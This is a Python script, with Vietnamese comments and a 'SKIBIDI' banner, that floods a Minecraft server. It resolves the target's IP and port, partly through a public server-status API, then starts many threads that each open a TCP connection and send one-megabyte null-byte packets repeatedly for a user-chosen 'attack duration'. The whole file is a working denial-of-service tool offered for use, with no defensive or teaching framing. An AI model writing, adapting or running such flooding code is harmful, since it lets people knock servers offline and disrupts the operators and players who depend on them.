import os
import subprocess
import sys
import importlib
import socket
import threading
import time
from datetime import datetime
from colorama import init, Fore, Style
import requests

# Danh sách các module cần thiết
required_modules = [
    "requests", "colorama"
]

def check_and_install_module(module_name):
    try:
        importlib.import_module(module_name)
        print(f"[+] Module đang được cài đặt.")
        return True
    except ImportError:
        print(f"[-] Module chưa cài. Đang tiến hành cài đặt...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", module_name])
            print(f"[+] Cài đặt {module_name} thành công!")
            return True
        except subprocess.CalledProcessError as e:
            print(f"[!] Lỗi khi cài {module_name}: {e}")
            return False

def check_required_modules():
    all_installed = True
    for module in required_modules:
        if not check_and_install_module(module):
            all_installed = False
    return all_installed

if not check_required_modules():
    print("[!] Thiếu các module bắt buộc. Vui lòng kiểm tra lại.")
    sys.exit(1)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

init()

BANNER = f"""
{Fore.RED}
███████╗██╗  ██╗██╗██████╗ ██╗██████╗ ██╗
██╔════╝██║ ██╔╝██║██╔══██╗██║██╔══██╗██║
███████╗█████╔╝ ██║██████╔╝██║██║  ██║██║
╚════██║██╔═██╗ ██║██╔══██╗██║██║  ██║██║
███████║██║  ██╗██║██████╔╝██║██████╔╝██║
╚══════╝╚═╝  ╚═╝╚═╝╚═════╝ ╚═╝╚═════╝ ╚═╝
{Style.RESET_ALL}
"""

def get_server_ip(server_address):
    try:
        if ":" in server_address:
            host, port = server_address.rsplit(":", 1)
            port = int(port)
            ip_address = socket.gethostbyname(host)
            print(f"{Fore.GREEN}[+] ᴇxᴛʀᴀᴄᴛᴇᴅ ɪᴘ: {ip_address}, ᴘᴏʀᴛ: {port}{Style.RESET_ALL}")
            return ip_address, port
        else:
            print(f"{Fore.YELLOW}[ɪ] ɴᴏ ᴘᴏʀᴛ ᴘʀᴏᴠɪᴅᴇᴅ, ғᴇᴛᴄʜɪɴɢ ғʀᴏᴍ ᴀᴘɪ...{Style.RESET_ALL}")
            try:
                res = requests.get(f"https://api.mcsrvstat.us/2/{server_address}", timeout=5).json()
                ip = res.get("ip") or socket.gethostbyname(server_address)
                port = int(res.get("port") or 25565)
                if not res.get("online"):
                    print(f"{Fore.YELLOW}[-] ᴀᴘɪ ʀᴇᴘᴏʀᴛs sᴇʀᴠᴇʀ ᴏғғʟɪɴᴇ, ᴜsɪɴɢ ɪᴘ {ip}:{port}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.GREEN}[+] ᴀᴘɪ ʀᴇᴛᴜʀɴᴇᴅ: ɪᴘ {ip}, ᴘᴏʀᴛ {port}{Style.RESET_ALL}")
                return ip, port
            except Exception as api_error:
                print(f"{Fore.YELLOW}[-] ᴄᴀɴɴᴏᴛ ғᴇᴛᴄʜ ɪᴘ ᴠɪᴀ ᴀᴘɪ: {api_error}, ғᴀʟʟɪɴɢ ʙᴀᴄᴋ ᴛᴏ ᴅɴs{Style.RESET_ALL}")
                ip = socket.gethostbyname(server_address)
                print(f"{Fore.GREEN}[+] ᴅɴs ғᴀʟʟʙᴀᴄᴋ: ɪᴘ {ip}, ᴘᴏʀᴛ 25565{Style.RESET_ALL}")
                return ip, 25565
    except Exception as e:
        print(f"{Fore.RED}[ᴇʀʀ] ᴇʀʀᴏʀ ᴘʀᴏᴄᴇssɪɴɢ ᴀᴅᴅʀᴇss: {e}{Style.RESET_ALL}")
        return None, None

def send_packet(server_ip, server_port, packet, packet_count, thread_id, stop_event):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(3)
            s.connect((server_ip, server_port))
            for i in range(packet_count):
                if stop_event.is_set():
                    break
                s.sendall(packet)
                now = datetime.now().strftime("%H:%M:%S")
                print(f"{Fore.CYAN}[{now}] ᴛʜʀᴇᴀᴅ:{thread_id} | sᴇɴᴅ ᴘᴀᴄᴋᴇᴛ: ({i + 1}/{packet_count}){Style.RESET_ALL}")
    except Exception as e:
        now = datetime.now().strftime("%H:%M:%S")
        print(f"{Fore.RED}[{now}] ᴛʜʀᴇᴀᴅ:{thread_id} | ᴇʀʀᴏʀ: {e}{Style.RESET_ALL}")

def stop_after_timeout(stop_event, timeout):
    time.sleep(timeout)
    stop_event.set()
    print(f"{Fore.YELLOW}\n⛔ sᴛᴏᴘᴘᴇᴅ sᴇɴᴅɪɴɢ ᴀғᴛᴇʀ {timeout} sᴇᴄᴏɴᴅs{Style.RESET_ALL}")

def run_ski():
    clear_screen()
    print(BANNER)

    try:
        server_address = input(f"{Fore.YELLOW}[+]ᴛᴀʀɢᴇᴛ ɪᴘ [ɪᴘ/ᴅᴏᴍᴀɪɴ ᴏʀ ɪᴘ:ᴘᴏʀᴛ]: {Style.RESET_ALL}")
        server_ip, server_port = get_server_ip(server_address)
        if not server_ip:
            raise ValueError(f"{Fore.RED}ᴄᴀɴɴᴏᴛ ʀᴇsᴏʟᴠᴇ sᴇʀᴠᴇʀ ᴀᴅᴅʀᴇss{Style.RESET_ALL}")

        timeout = int(input(f"{Fore.YELLOW}[+]ᴀᴛᴛᴀᴄᴋ ᴅᴜʀᴀᴛɪᴏɴ (sᴇᴄᴏɴᴅs): {Style.RESET_ALL}"))
        if timeout <= 0:
            raise ValueError(f"{Fore.RED}[ᴇʀʀ] ᴀᴛᴛᴀᴄᴋ ᴅᴜʀᴀᴛɪᴏɴ ᴍᴜsᴛ ʙᴇ > 0{Style.RESET_ALL}")

        packet = b"\x00" * (1 * 1024 * 1024)
        packet_count = 100000

        thread_count = int(input(f"{Fore.YELLOW}[+] ᴛʜʀᴇᴀᴅ ᴄᴏᴜɴᴛ: {Style.RESET_ALL}"))
        if thread_count <= 0:
            raise ValueError(f"{Fore.RED}[ᴇʀʀ] ᴛʜʀᴇᴀᴅ ᴄᴏᴜɴᴛ ᴍᴜsᴛ ʙᴇ > 0{Style.RESET_ALL}")

        print(f"{Fore.GREEN}[+] sᴛᴀʀᴛɪɴɢ ᴀᴛᴛᴀᴄᴋ ᴏɴ {server_ip}:{server_port} ᴡɪᴛʜ {thread_count} ᴛʜʀᴇᴀᴅs...{Style.RESET_ALL}")

        stop_event = threading.Event()
        timer_thread = threading.Thread(target=stop_after_timeout, args=(stop_event, timeout))
        timer_thread.start()

        threads = []
        for i in range(thread_count):
            t = threading.Thread(target=send_packet,
                                 args=(server_ip, server_port, packet, packet_count, i + 1, stop_event))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        print(f"{Fore.GREEN}[+] ᴀᴛᴛᴀᴄᴋ ᴄᴏᴍᴘʟᴇᴛᴇᴅ ✅{Style.RESET_ALL}")

    except Exception as e:
        print(f"{Fore.RED}ᴇʀʀᴏʀ: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    run_ski()
